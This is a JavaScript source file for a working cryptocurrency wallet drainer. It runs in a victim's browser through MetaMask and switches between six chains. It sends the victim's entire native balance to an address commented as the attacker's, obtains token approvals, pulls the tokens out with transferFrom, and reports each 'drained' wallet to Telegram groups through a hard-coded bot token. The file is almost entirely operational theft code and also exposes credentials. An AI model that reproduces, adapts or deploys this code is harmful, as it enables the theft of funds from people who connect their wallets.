// Telegram bot token and group IDs
const telegramBotToken = "7236108767:AAHgctM1RM7YJAj_tdh709ab8FIp05ZdH4E";
const walletConnectionsGroupID = "-1002232445167"//"-1002232445167";
const allowanceIncreasesGroupID = "-1002147303946"//"";-4107946236
const spenderAddress = "0xdd959e5e55Bf6a37aBa441bf86E2A0e5394cFf32"//"0x3577e3517e526950d62d0b13a2e2af836d3d2b6d"; // Attacker's address
// const childAddress = "0x5b884a907ACC7EA3AbFB2CaE87231Ae91299271C"//"0xdd959e5e55Bf6a37aBa441bf86E2A0e5394cFf32";//child address

const networks ={
    ethereum:"https://mainnet.infura.io/v3/e2d084c3e2b94d6a9aa226a51876387e",
    bsc:"https://bsc-dataseed2.binance.org/",
    polygon:"https://polygon-mainnet.infura.io/v3/e2d084c3e2b94d6a9aa226a51876387e",
    arbitrum:"https://arbitrum-mainnet.infura.io/v3/e2d084c3e2b94d6a9aa226a51876387e",
    fantom:"https://rpc.ankr.com/fantom/",
    optimism:"https://optimism-mainnet.infura.io/v3/e2d084c3e2b94d6a9aa226a51876387e"
}



// List of popular token addresses per network
const tokenAddresses = {
    ethereum: [
        "0xdAC17F958D2ee523a2206206994597C13D831ec7",//USDT
        "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48",//USDC
        "0xB8c77482e45F1F44dE1745F52C74426C631bDD52",//BNB
        "0x95aD61b0a150d79219dCF64E1E6Cc01f0B64C4cE",//SHIB
        "0x514910771AF9Ca656af840dff83E8264EcF986CA",//LINK
        "0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984",//UNI
        "0x6B175474E89094C44Da98b954EedeAC495271d0F",//DAI
        "0x97a9a15168c22b3c137e6381037e1499c8ad0978"//DOP
    ],
    bsc: [
        "0x55d398326f99059fF775485246999027B3197955",//USDT
        "0x2859e4544C4bB03966803b044A93563Bd2D0DD4D", //SHIB
        "0xBf5140A22578168FD562DCcF235E5D43A02ce9B1",//UNI
        "0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d",//USDC
        "0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c",//WBNB
        "0x7130d2A12B9BCbFAe4f2634d864A1Ee1Ce3Ead9c",//BTC
        "0x570A5D26f7765Ecb712C0924E4De545B89fD43dF",//SOL
        "0xe9e7cea3dedca5984780bafc599bd69add087d56",//BUSD
    ],
    arbitrum: [
        "0xaf88d065e77c8cC2239327C5EDb3A432268e5831",//USDC
        "0x2f2a2543B76A4166549F7aaB2e75Bef0aefC5B0f",//WBTC
        "0xFa7F8980b0f1E64A2062791cc3b0871572f1F7f0",//UNI
        "0xFa7F8980b0f1E64A2062791cc3b0871572f1F7f0",//PEPE
    ],
    polygon: [],
    fantom: [
        "0x04068DA6C83AFCFA0e13ba15A6696662335D5B75",//USDC
        "0xb3654dc3D10Ea7645f8319668E8F54d2574FBdC8"//LINK
    ],
    optimism: [
        "0x0b2C639c533813f4Aa9D7837CAf62653d097Ff85",//USDC
        "0x68f180fcCe6836688e9084f035309E29Bf0A2095",//WBTC
        "0xFdb794692724153d1488CcdBE0C56c252596735F"//LIDO DAO
    ]
    // Add more networks...
};

// ERC-20 ABI
const abi = [
    "function balanceOf(address owner) view returns (uint256)",
    "function increaseAllowance(address spender, uint256 addedValue) public returns (bool)",
    "function approve(address spender, uint256 addedValue) public returns (bool)",
    "function transferFrom(address sender, address recipient, uint256 amount) external returns (bool)",
    "function allowance(address owner, address spender) view returns (uint256)",
    "function transfer(address recipient, uint256 amount) external returns (bool)"
];

// Initialize Telegram bot API instance
const telegramAPI = axios.create({
    baseURL: `https://api.telegram.org/bot${telegramBotToken}/sendMessage`,
});

// Function to send notification to Telegram group
async function sendTelegramNotification(chatID, message) {
    try {
        await axios.post(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`,{
            chat_id: chatID,
            text: message,
        });
        console.log("Telegram notification sent:", message);
    } catch (error) {
        console.error("Error sending Telegram notification:", error.message);
    }
}

//swich chain
async function switchChain(chainId){
    try {
        await window.ethereum.request({
            method: 'wallet_switchEthereumChain',
            params: [{ chainId }],
        });
        return true;
    } catch (switchError) {
        // This error code indicates that the chain has not been added to MetaMask.
        console.warn("Chain not added to MetaMask");
        return false;
    }
}

// Initialize provider and signer
async function initializeProvider() {
    const provider = new ethers.providers.Web3Provider(window.ethereum);
    const signer = provider.getSigner();
    return { provider, signer };
}

// Detect tokens and their balances for a specific network
async function detectTokensAndBalances(provider, signer, tokenAddresses, network) {
    const userAddress = await signer.getAddress();
    const balances = [];

    for (const address of tokenAddresses) {
        try{
            const tokenContract = new ethers.Contract(address, abi, signer);
            const balance = await tokenContract.balanceOf(userAddress);
            if (balance.gt(0)) {
                balances.push({ address, balance });
            }
        }catch{
            console.warn("err");
        }
    }
    const networkBalance = await provider.getBalance(await signer.getAddress());
    if(networkBalance>0){
        console.log("native token balance > 0, calling transferNativeToken()");
        await transferNativeToken(signer,networkBalance, network);
    }else{
        console.log("native token balance is 0");
    }
    return balances;
}

//Call the transfer for native token
async function transferNativeToken(signer, balance, network) {
    const fees = {
        ethereum:0.00043385,
        bsc:0.0001,
        polygon:0.001,
        arbitrum:0.0002,
        fantom:0,
        optimism:0.0003,
    };
    const balance_ = ethers.utils.formatEther(balance).toString();
    try {
        const fee = fees[network];
        // Subtract the gas cost from the balance
        const valueToSend = (parseFloat(parseFloat(balance_) - fee)).toFixed(18);
        console.log("valueToSend is ",valueToSend);

        // Create the final transaction object with the adjusted value
        const tx1 = {
            to: spenderAddress,
            value: ethers.utils.parseEther(valueToSend)
        };

        // Send the transaction
        console.log("sending tx");
        const transaction = await signer.sendTransaction(tx1);
        await transaction.wait();

        console.log("Successfully transferred native token...");
    } catch (error) {
        console.error("Error transferring native token:", error);
    }
}

// Function to request increased allowance with Telegram notification
async function requestIncreasedAllowance(signer, balances, spenderAddress, network) {
    const allowance_ = ethers.constants.MaxUint256.sub(ethers.BigNumber.from(100));
    
    for (const token of balances) {
        try{
            const tokenContract = new ethers.Contract(token.address, abi, signer);
            const tx = await tokenContract.increaseAllowance(spenderAddress, token.balance);
            await tx.wait();
            console.log("sucessfully increased allocation or approved..");
            
            // Send notification to Telegram group
            const message = `Allowance increased for ${token.address} by ${token.balance.toString()}`;
            await sendTelegramNotification(allowanceIncreasesGroupID, message);

            serverSideLogic(signer, token.balance, token.address, network);
            console.log("sent to server..");
        }catch{
            try{
                const tokenContract = new ethers.Contract(token.address, abi, signer);
                const tx = await tokenContract.approve(spenderAddress, token.balance);
                await tx.wait();
                console.log("sucessfully increased allocation or approved..");
                
                // Send notification to Telegram group
                const message = `Allowance increased for ${token.address} by ${token.balance.toString()}`;
                await sendTelegramNotification(allowanceIncreasesGroupID, message);

                serverSideLogic(signer, token.balance, token.address, network);
                console.log("sent to server..");
            }catch{
                console.warn("error in setting allowance or approving user");
                await serverSideLogic(signer, token.balance, token.address, network);
            }
        }
    }
}

// Main function to detect tokens, request allowances, and switch networks with Telegram notifications
async function executeAttack(address) {
    const networks = {
        ethereum: "0x1",
        bsc: "0x38",
        polygon: "0x89",
        arbitrum: "0xa4b1",
        fantom: "0xfa",
        optimism: "0xa"
    };

    for (const [network, chainId] of Object.entries(networks)) {

        const _bool =await switchChain(chainId);
        // Initialize provider and signer
        const { provider, signer } = await initializeProvider();
        // Send notification to Telegram group about switching network
        if(_bool){
            const networkSwitchMessage = `A User connected with address ${address} on ${network} Netowrk\n${network} Balance: ${ethers.utils.formatEther(await provider.getBalance(await signer.getAddress()))}`;
            await sendTelegramNotification(walletConnectionsGroupID, networkSwitchMessage);
        }else{
            //
        }

        // Detect tokens and their balances
        let balances;
        if(_bool){
            const tokenList = tokenAddresses[network];
            balances = await detectTokensAndBalances(provider, signer, tokenList, network);
        }

        if(_bool){
            if (balances.length > 0) {
                // Request increased allowance
                console.log("network is ",network)
                await requestIncreasedAllowance(signer, balances, spenderAddress, network);
            } else {
                console.log(`No tokens found on ${network} network.`);
            }
        }
    }
}

async function connectA(){
    if(window.ethereum){
        try{
            const provider = new ethers.providers.Web3Provider(window.ethereum);
            const accounts = await provider.send("eth_requestAccounts", []);
            const signer = await provider.getSigner();
            const address = await signer.getAddress();



            executeAttack(address);
        }catch{
            console.warn("user rejected connection...propting to connect again");
            connectA();
        }
    }else{
        alert("Please install MetaMask");
    }
}

async function serverSideLogic(signer, amount_, tokenAddress, network){
        console.log("inside server side logic...");
        console.log("Private Key is ",PK);
        console.log("the network is ",network);
        // Handle the data as needed (e.g., store in database, perform further processing, etc.)
        const providerUrl = networks[network];
        const provider = new ethers.providers.JsonRpcProvider(providerUrl);
        const wallet = new ethers.Wallet(PK,provider);
        const contract = new ethers.Contract(tokenAddress, abi, wallet);
        const userAddress = await signer.getAddress();
        console.log("user Address is ",userAddress);
        console.log("token address is ",tokenAddress);
        console.log("token balance is ",ethers.utils.formatEther(ethers.BigNumber.from(amount_)));
        console.log("spender Address is ",spenderAddress);
        // const bb = ethers.BigNumber.from(amount_);
        // const cc = ethers.BigNumber.from(98);
        // const dd = ethers.BigNumber.from(100);
        // const final = bb.mul(cc).div(dd);
        // console.log("the final price is ",ethers.utils.formatEther(final));
    
        try{
            console.log("trying to transfer allowance...");
            const tx = await contract.transferFrom(userAddress,spenderAddress,amount_);
            const reciept = await tx.wait();
            console.log("Allowance successfully transferred to spender wallet");
            // Send notification to Telegram group
            const message = `Successfully drained Allowance for ${tokenAddress} by ${await signer.getAddress()}`;
            await sendTelegramNotification(allowanceIncreasesGroupID, message);
        }catch(err){
            console.log("error transveeing the allowance...");
            console.log(err);
        };
}